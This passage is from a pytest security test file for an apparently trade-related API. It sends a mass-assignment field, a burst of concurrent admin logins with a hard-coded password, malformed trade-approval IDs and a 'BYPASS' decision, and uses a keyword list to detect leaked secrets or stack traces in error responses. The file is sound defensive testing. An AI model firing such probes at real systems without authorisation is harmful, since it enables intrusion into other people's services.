            "user_id": "admin_override"
        }
        
        response = test_client.post("/api/auth/login", json=extended_login_data)
        
        # Should not allow mass assignment
        assert response.status_code in [400, 401, 422]
    
    def test_race_condition_exploitation(self, test_client):
        """Test race condition exploitation."""
        # Try to exploit race conditions in authentication
        def attempt_login():
            return test_client.post("/api/auth/login", json={
                "username": "admin",
                "password": "admin123!"
            })
        
        # Make concurrent login attempts
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(attempt_login) for _ in range(50)]
            results = [future.result() for future in futures]
        
        # Should handle concurrent requests consistently
        success_count = sum(1 for r in results if r.status_code == 200)
        error_count = sum(1 for r in results if r.status_code >= 500)
        
        # Should not have race condition errors
        assert error_count == 0
    
    def test_business_logic_bypass(self, test_client, valid_auth_token):
        """Test business logic bypass attempts."""
        # Try to bypass business logic checks
        headers = {"Authorization": f"Bearer {valid_auth_token}"}
        
        # Test various bypass attempts
        bypass_attempts = [
            {"trade_id": "0", "decision": "APPROVE"},
            {"trade_id": "-1", "decision": "APPROVE"},
            {"trade_id": "999999999", "decision": "APPROVE"},
            {"trade_id": "null", "decision": "APPROVE"},
            {"trade_id": "", "decision": "APPROVE"},
            {"trade_id": "admin", "decision": "BYPASS"}
        ]
        
        for attempt in bypass_attempts:
            attempt.update({
                "reasoning": "Business logic bypass attempt",
                "user_id": "test_user"
            })
            
            response = test_client.post("/api/dashboard/decide", json=attempt, headers=headers)
            
            # Should validate business logic
            assert response.status_code in [400, 422]
    
    def test_information_disclosure_via_errors(self, test_client):
        """Test information disclosure via error messages."""
        # Test various error-inducing inputs
        error_inputs = [
            {"username": None, "password": "test"},
            {"username": [], "password": "test"},
            {"username": {}, "password": "test"},
            {"username": 123, "password": "test"},
            {"invalid_field": "test"},
            {}  # Empty payload
        ]
        
        for input_data in error_inputs:
            response = test_client.post("/api/auth/login", json=input_data)
            
            # Should not disclose sensitive information in errors
            response_text = response.text.lower()
            sensitive_indicators = [
                "traceback",
                "stack trace",
                "database",
                "sql",
                "password",
                "secret",
                "key",
                "token",
                "session",
                "internal",
                "debug",
                "exception",
                "error at line"
            ]
            
            for indicator in sensitive_indicators:
                assert indicator not in response_text, f"Information disclosure with input: {input_data}"

if __name__ == "__main__":
    pytest.main([__file__, "-v"])